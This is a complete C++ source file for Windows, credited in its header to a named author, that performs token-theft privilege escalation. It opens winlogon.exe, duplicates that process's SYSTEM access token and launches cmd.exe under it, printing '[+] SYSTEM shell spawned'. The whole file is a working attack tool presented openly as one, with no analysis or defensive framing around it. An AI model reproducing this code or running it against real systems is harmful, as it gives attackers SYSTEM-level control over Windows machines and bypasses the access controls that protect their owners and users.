// Filename: handle_spoofing_token_elevation.cpp
// Description: Spoof access token from SYSTEM process to elevate current process
// Author: Joas A Santos

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetPidByName(const std::wstring& name) {
    PROCESSENTRY32W entry = { sizeof(entry) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (name == entry.szExeFile) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

int wmain() {
    DWORD targetPID = GetPidByName(L"winlogon.exe"); // SYSTEM-level process

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (!hProc) return 1;

    HANDLE hToken;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        std::wcerr << L"[-] Failed to open process token.\n";
        return 1;
    }

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        std::wcerr << L"[-] Failed to duplicate token.\n";
        return 1;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessWithTokenW(hDupToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        std::wcout << L"[+] SYSTEM shell spawned.\n";
    } else {
        std::wcerr << L"[-] Failed to create process.\n";
    }

    return 0;
}
